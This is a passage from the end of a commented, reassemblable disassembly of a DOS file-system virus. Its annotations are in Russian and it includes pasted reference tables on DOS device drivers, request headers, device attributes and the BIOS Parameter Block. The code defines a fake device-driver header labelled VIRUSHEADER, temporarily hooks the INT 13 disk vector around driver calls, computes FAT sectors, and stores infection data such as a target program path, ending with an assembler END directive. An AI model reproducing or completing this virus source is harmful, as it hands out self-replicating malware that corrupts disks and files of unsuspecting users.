                CMP     DI,SI
                JE      LOC_RET_0460
                JMP     LOC_03D6
LOC_RET_0460:
                RETN
SUB_03D6        ENDP

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

;╔══════════════════════════════════════════════════════════════════════════════╗
;║  еще                   Структуры запросов устройств                 еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;                       ┌───────────────────┐
;                       │ Контроль носителя │ Код команды устройства: 1
;Смещ.  Длина Содержимое└───────────────────┘
;▀▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───────────────────────────────────────────────────┐
; +0     0dH │ 13-байтовый заголовок запроса                     │
;            ├───┼───┴───┴───┴───┼───┴───┴───┴───┴───┴───┴───┴───┘
; +0dH    1  │   │  Вход: байт дескриптора носителя (DOS спрашивает об изменении)
;            ├───┤
; +0eH    1  │   │  Выход: 0ffH=носитель изменился; 1=тот же; 0=не знаю
;            ├───┴───┬───────┐
; +0fH    4  │ смещ.  сегмент│ Выход: адрес предыдущего имени тома (ASCIIZ)
;            └───┴───┴───┴───┘ (если носитель изменился и поддерживается RM)
;╔══ ЕЩЕ    ══════════════════════════════════════════════════════════════════╗
CHECKDISK       PROC    NEAR
                MOV     AH,[BX+1]       ; номер единицы (только для блочных
                                        ; устройств)
PUTAH           EQU     $+2
                CMP     AH,2
                MOV     BYTE PTR CS:PUTAH,AH
                JNZ     LOC_RET_0482
                PUSH    WORD PTR [BX+0EH]
                MOV     BYTE PTR [BX+2],1       ; Контроль носителя
                CALL    EXECDRVFUNC
                CMP     BYTE PTR [BX+0EH],1     ; тот же носитель ?
                POP     WORD PTR [BX+0EH]
                MOV     [BX+2],AL
LOC_RET_0482:
                RETN
CHECKDISK       ENDP

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

EXECDRVFUNCWRITE        PROC    NEAR
                CMP     BYTE PTR ES:[BX+2],8    ; Вывод (писать на устр-во)
                JAE     LOC_04B2
                MOV     BYTE PTR ES:[BX+2],4
                MOV     SI,70H
                MOV     DS,SI
VAR_495         EQU     $+1
                MOV     SI,0B4H
                PUSH    WORD PTR [SI]
                PUSH    WORD PTR [SI+2]
                MOV     WORD PTR [SI],OFFSET INT13      ; заменить int 13
                MOV     [SI+2],CS                       ; на запись int 13
                CALL    EXECDRVFUNC
                POP     WORD PTR [SI+2]
                POP     WORD PTR [SI]
                RETN
EXECDRVFUNCWRITE        ENDP

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

EXECFUNCFORONESEC       PROC    NEAR
                MOV     WORD PTR ES:[BX+12H],1  ; счетчик байт (секторов для
                                                ; блочного устр-ва) = 1

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

EXECDRVFUNC     PROC    NEAR
LOC_04B2:
;*              call    far ptr s_0070_06F5     ;*
                DB       9AH
DOSOFF1         DW       06F5H
                DW       0070H
;*              call    far ptr s_0070_073E     ;*
                DB       9AH
DOSOFF2         DW       073EH
                DW       0070H
                TEST    BYTE PTR ES:[BX+4],80H  ; слово состояния устройства -
                                                ; заполняет драйвер
                RETN
EXECDRVFUNC     ENDP
EXECFUNCFORONESEC       ENDP
;╔══════════════════════════════════════════════════════════════════════════════╗
;║                          Слово состояния устройства                  еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
; 1 1 1 1 1 1
;╓5┬4┬3┬2┬1┬0┬9┬8╥7┬6┬5┬4┬3┬2┬1┬0╖
;║e│резерв   │b│d║  код ошибки   ║  s = 16-битовое слово (заголовок, смещение 3)
;╙╥┴─┴─┴─┴─┴─┴╥┴╥╨─┴─┴─┴─┴─┴─┴─┴─╜  бит                                  маска
; ║           ║ ║ ╚═════════════╩═>  0-7: код ошибки устройства       (s & 00ffH)
; ║           ║ ╚═════════════════>  8: 1=готово (всегда при выходе)  (s & 0100H)
; ║           ╚═══════════════════>  9: 1=занято (команды 6 и 0fH)    (s & 0200H)
; ╚═══════════════════════════════> 15: 1=встретилась ошибка          (s & 8000H)
;
;Драйвер устройства всегда возвращает в DOS слово состояния устройства. Это слово
;расположено по смещению 3 в Заголовке запроса . При нормальном завершении запро-
;са драйвер должен установить бит "готово" и выйти через FAR RET.
;
;Бит "занято" устанавливается обработчиком запроса, когда он определяет невозмож-
;ность удовлетворения запроса из-за того, что физическое устройство занято преды-
;дущим запросом. Через этот бит возвращается и другая информация, такая как
;"очередь клавиатуры непуста" или "носитель съемный".      См. Запросы устройств
;
;Бит "ошибка" устанавливается, когда драйвер получает невыполнимый запрос или
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                              SUBROUTINE
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

GETSECFAT       PROC    NEAR
                CMP     AX,0FF0H        ; проверка на 16-битную FAT
                JAE     LOC_04D8
                MOV     SI,3            ; умножим на 3 и разделим на 2
                MUL     SI
                SHR     AX,1                    ; ax=ax>>1 cf<-выдвинутый бит
                MOV     DI,0FFFH
                JNC     LOC_04E0        ; проверка на чётнай кластер
                MOV     DI,0FFF0H
                JMP     SHORT LOC_04E0
LOC_04D8:
                MOV     SI,2            ; умножим на 2
                MUL     SI
                MOV     DI,0FFFFH
LOC_04E0:
                MOV     SI,200H         ; ax=ax/512
                DIV     SI              ; определим сектор для FAT в ax
                INC     AX
                RETN
GETSECFAT       ENDP
;╔══════════════════════════════════════════════════════════════════════════════╗
;║                        Структура заголовка устройства                        ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;
;Двоичный образ файла драйвера устройства начинается с этой структуры. Во время
;установки драйвера поле Next_Device корректируется, отражая включение в цепь.
;
;Смещ.  Длина Содержимое
;▀▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───────┬───────┐ Next_Device: FAR адрес след. устройства в цепи
; +0      4  │ смещ.  сегмент│ (смещение=0ffffH, если это последний драйвер)
;            ├───┴───┼───┴───┘
; +4      2  │DevAttr│         битовые поля, составляющие Атрибут устройства
;            ├───┴───┤
; +6      2  │Stratgy│         смещение программы устройства STRATEGY
;            ├───┴───┤
; +8      2  │Intrupt│         смещение программы устройства INTERRUPT
;            ├───┴───┴───────────────────────┐
;+0aH     8  │'L' 'P' 'T' '1' 20H 20H 20H 20H│ дополненное пробелами имя устр-ва
;            └───┴───┴───┴───┴───┴───┴───┴───┘ (или номер субустройства)
────────────────────────────────────────────────────────────────────────────────
;DOS Fn 32H   Атрибут устройства   Запросы устройства         Драйверы устройств
;═══════════════════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║  еще                    Основы драйверов устройств                          ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;┌────────────────────────┐
;│ Strategy  и  Interrupt │ Два поля в заголовке устройства - это 16-битовые
;└────────────────────────┘ адреса программ в кодовом сегменте драйвера.
;По любому запросу устройства DOS сначала вызывает программу Strategy, передавая
;ей адрес Заголовка Запроса в ES:BX. Задачей программы Strategy является сохра-
;нение этого ES:BX для последующего использования (в мультизадачной среде для
;этого требуется поддерживать FIFO-очередь запросов).
;
;Затем DOS вызывает программу Interrupt (без параметров). Ее задача состоит в
;извлечении адреса самого "свежего" заголовка запроса и обработке команды, ука-
;занной в заголовке запроса. Различные команды устройств используют разные
;структуры пакетов данных в системе DOS. См. Структуры запросов устройств , где
;приведены команды устройств и их описания. Как правило, драйвер содержит нечто
;вроде N-арного узла ветвлений для обработки всех возможных запросов.
;
;Обработав запрос, драйвер должен установить Слово Состояния Устройства , инди-
;цирующее статус завершения и ошибки, а затем вернуться в DOS через FAR RET.
;───────────────────────────────────────────────────────────────────────────────
;                                                            Драйверы устройств
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
;╔══════════════════════════════════════════════════════════════════════════════╗
;║                              Атрибут устройства                      еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;
;Поле DevAttr Заголовка устройства указывает свойства устройства.
; 1 1 1 1 1 1
;╓5┬4┬3┬2┬1┬0┬9┬8╥7┬6┬5┬4┬3┬2┬1┬0╖
;║ │ │ │0│ │0 0 0 0│ │0 0│ │ │ │ ║
;╙╥┴╥┴╥┴─┴╥┴─┴─┴─╨─┴╥┴─┴─┴╥┴╥┴╥┴╥╜  бит                                    маска
; ║ ║ ║   ║         ║     ║ ║ ║ ╚═>  0: 1=стандартное входное устройство  (0001H)
; ║ ║ ║   ║         ║     ║ ║ ╚═══>  1: 1=стандартное выходное устройство (0002H)
; ║ ║ ║   ║         ║     ║ ╚═════>  2: 1=стандартное устройство NUL      (0004H)
; ║ ║ ║   ║         ║     ╚═══════>  3: 1=часы                            (0008H)
; ║ ║ ║   ║         ╚═════════════>  6: 1=поддерживает логические устр-ва (0040H)
; ║ ║ ║   ╚═══════════════════════> 11: 1=поддерживает open/close/RM      (0800H)
; ║ ║ ╚═══════════════════════════> 13: 1=не-IBM блочное устройство       (2000H)
; ║ ╚═════════════════════════════> 14: 1=поддерживает IOCTL              (4000H)
; ╚═══════════════════════════════> 15: 1=символьное устройство; 0=блочное(8000H)
;
;Замечания:
; установите стандартные биты в/в (0 и 1), если вы заменяете драйвер CON
;
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
VIRUSHEADER:
                DW      0C340H, 0012H
                DW      0A42H
;  15 14 13 12 11 10  9  8  7  6  5  4  3  2  1  0 - номер бита атрибута
;   0  0  0  0  1  0  1  0  0  1  0  0  0  0  1  0 - сами биты
;  - поддерживает open/close/RM
;  - поддерживает логические устр-ва
;  - стандартное выходное устройство

                DW       DEVSTRATEGY
                DW       DEVINTERRUPT
                DB       7FH
VAR_4F2         DW       0000H, 0080H
; var_4F2 + 4
                DW      011F4H, 005CH
; var_4F2 + 8
                DW      011F4H, 006CH
; var_4F2 +12
                DW      011F4H, 0000H
;--- здесь хранятся некоторые переменные ( 32 байта )
;╔══════════════════════════════════════════════════════════════════════════════╗
;║              Блок параметров BIOS (BIOS Parameter Block - BPB)       еще    ║
;╚══════════════════════════════════════════════════════════════════════════════╝
;Это - подмножество данных, содержащихся в корневом секторе . Запрос к драйверу
;'Построить BPB' требует, чтобы драйвер заполнил блок по показанной ниже схеме.
;
;Смещ.  Длина Содержимое
;▀▀▀▀▀▀ ▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;            ┌───────┐
; +0      2  │SectSiz│  байт на сектор
;            ├───┼───┘
; +2      1  │ClustSiz  секторов на единицу респределения (кластер)
;            ├───┴───┐
; +3      2  │ResSecs│  корневых и резервных секторов
;            ├───┼───┘
; +5      1  │FatCnt    число таблиц FAT
;            ├───┴───┐
; +6      2  │RootSiz│  макс.число 32-байтовых элементов в корневом оглавлении
;            ├───┴───┤
; +8      2  │TotSecs│  общее число секторов на носителе (раздел DOS)
;            ├───┼───┘
;+0aH     1  │Media     описатель носителя (то же, что 1-й байт FAT)
;            ├───┴───┐
;+0bH     2  │FatSize│  число секторов в одной FAT
;            └───┴───┘
; 0dH        длина BPB = 13 байт
;╔══ ЕЩЕ   ════════════════════════════════════════════════════════════════════╗
MYBPB           DW       200H   ; байт на сектор
                DB       8      ; секторов на единицу респределения (кластер)
                DW       1      ; корневых и резервных секторов
                DB       2      ; число таблиц FAT
                DW       512    ; макс.число 32-байтовых элементов в корневом
                                ; оглавлении
                DW       5041H  ; общее число секторов на носителе (раздел DOS)
                DB       0F8H   ; описатель носителя (то же, что 1-й байт FAT)
                DW       8      ; число секторов в одной FAT
		DW	 1FH			
		DW	 4			
		DW	 1FH			
		DW 	 0			
		DW 	 0	; общее число секторов на носителе (младшее 
				; слово). Только, если [MYBPB+8]=0
		DW 	 0	; общее число секторов на носителе (старшее
				; слово). Только, если [MYBPB+8]=0
		DW 	 0
                DB       00H, 05H, 21H, 00H,0A6H
;--- здесь храниться имя файла, взятое из строк окружения ( 80 байт )
FNAME           DB      'C:\vc\VC.COM'
                DB       00H, 41H, 54H, 00H, 4DH, 00H
                DB       00H, 00H, 00H, 0AH,0FCH,0F3H
                DB      0A4H, 58H, 59H, 5FH, 06H, 1FH
                DB      0E8H,0A2H, 4DH,0A2H, 0FH, 10H
                DB       00H, 5AH, 88H, 26H,0A5H, 02H
                DB       04H, 41H,0A2H, 05H, 02H,0F6H
                DB       50H, 41H, 54H, 48H, 3DH, 00H
                DB       'COMSPEC=A:\COMMAND.COM'
                DB       00H, 00H, 1EH, 55H
;--- эта область памяти не используется 
                DB      116 DUP (0)
                DB       01H, 3EH,0ABH, 8DH, 00H, 00H
                DB       00H, 00H, 70H, 00H, 72H, 05H
                DB       81H, 00H,0F4H, 11H,0F4H
                DB       11H, 1BH, 02H,0F4H, 11H, 46H
                DB       00H, 13H, 02H
                END     START
